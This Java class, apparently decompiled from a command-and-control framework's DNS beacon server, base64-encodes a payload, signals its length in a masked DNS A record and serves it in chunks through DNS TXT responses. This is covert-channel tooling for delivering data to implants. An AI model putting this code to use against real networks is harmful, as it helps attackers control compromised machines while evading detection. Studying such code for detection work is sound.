package beacon.dns;

import common.CommonUtils;
import dns.DNSServer;
import encoders.Base64;

public class SendConversationTXT extends SendConversation {
    protected StringBuffer readme = null;

    protected int maxtxt;

    public SendConversationTXT(String string1, String string2, long l, int n) {
        super(string1, string2, l);
        this.maxtxt = n;
    }

    public boolean started() {
        return (this.readme != null);
    }

    public DNSServer.Response start(byte[] arrby) {
        this.readme = new StringBuffer(Base64.encode(arrby));
        return DNSServer.A(arrby.length ^ this.idlemask);
    }

    public DNSServer.Response next() {
        if (this.readme.length() >= this.maxtxt) {
            String str1 = this.readme.substring(0, this.maxtxt);
            this.readme.delete(0, this.maxtxt);
            return DNSServer.TXT(CommonUtils.toBytes(str1));
        }
        String str = this.readme.toString();
        this.readme = null;
        return DNSServer.TXT(CommonUtils.toBytes(str));
    }

    public boolean isComplete() {
        if (this.readme == null)
            return true;
        if (this.readme.length() == 0) {
            CommonUtils.print_stat("readme.length() == 0: certain disaster! (prevented)");
            return true;
        }
        return false;
    }
}
